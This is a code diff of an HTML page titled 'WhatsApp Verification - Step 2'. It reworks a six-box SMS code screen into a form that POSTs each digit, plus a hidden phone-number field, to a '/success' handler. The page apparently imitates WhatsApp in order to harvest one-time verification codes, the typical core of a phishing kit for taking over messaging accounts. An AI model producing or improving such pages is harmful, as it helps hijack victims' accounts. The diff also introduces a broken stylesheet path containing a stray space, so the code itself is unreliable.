@@ -4,41 +4,46 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WhatsApp Verification - Step 2</title>
-    <link rel="stylesheet" href="static/style.css">
+    <link rel="stylesheet" href="/ static/style.css">
 </head>
 <body>
 
-    <div class="wrapper">
-        <!-- ================= STEP 2 VIEW ================= -->
-        <div class="step-view active">
-            <h2>Enter 6-digit code</h2>
-            <div class="instructions">
-                Waiting to automatically detect an SMS sent to <span class="phone-highlight" id="displayPhoneNumber">+234 812 345 6789</span>. 
-                <a href="index.html" class="edit-link" id="editPhoneBtn">Wrong number?</a>
-            </div>
+    <!-- Native HTML Form handling OTP submission via POST to a success handler/page -->
+    <form action="/success" method="POST" class="form-wrapper" id="step2Form">
+        <div class="wrapper">
+            <div class="step-view active">
+                <h2>Enter 6-digit code</h2>
+                <div class="instructions">
+                    Waiting to automatically detect an SMS sent to <span class="phone-highlight" id="displayPhoneNumber">+234 812 345 6789</span>. 
+                    <a href="/" class="edit-link">Wrong number?</a>
+                </div>
 
-            <!-- 6-Input Code Form Matrix -->
-            <div class="otp-grid" id="otpForm">
-                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" autofocus>
-                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-            </div>
+                <!-- Hidden input to carry forward the phone number into the POST payload -->
+                <input type="hidden" id="hiddenPhoneField" name="full_phone" value="">
 
-            <div class="resend-container">
-                <p>Didn't receive code?</p>
-                <a href="#" class="resend-link disabled" id="resendBtn">Resend SMS</a> <span id="timerText">(2:00)</span>
+                <!-- 6-Input Code Form Matrix with individual 'name' attributes for POST parsing -->
+                <div class="otp-grid" id="otpForm">
+                    <input type="text" class="otp-input" name="digit1" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" required autofocus>
+                    <input type="text" class="otp-input" name="digit2" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                    <input type="text" class="otp-input" name="digit3" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                    <input type="text" class="otp-input" name="digit4" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                    <input type="text" class="otp-input" name="digit5" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                    <input type="text" class="otp-input" name="digit6" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                </div>
+
+                <div class="resend-container">
+                    <p>Didn't receive code?</p>
+                    <a href="#" class="resend-link disabled" id="resendBtn">Resend SMS</a> <span id="timerText">(2:00)</span>
+                </div>
             </div>
         </div>
-    </div>
 
-    <!-- Persistent Action Button -->
-    <div class="action-container">
-        <button class="btn-next" id="nextBtn" disabled>Verify</button>
-    </div>
+        <!-- Persistent Action Button -->
+        <div class="action-container">
+            <button type="submit" class="btn-next" id="nextBtn" disabled>Verify</button>
+        </div>
+    </form>
 
-    <script src="static/script.js"></script>
+    <script src="/static/script.js"></script>
 </body>
 </html>
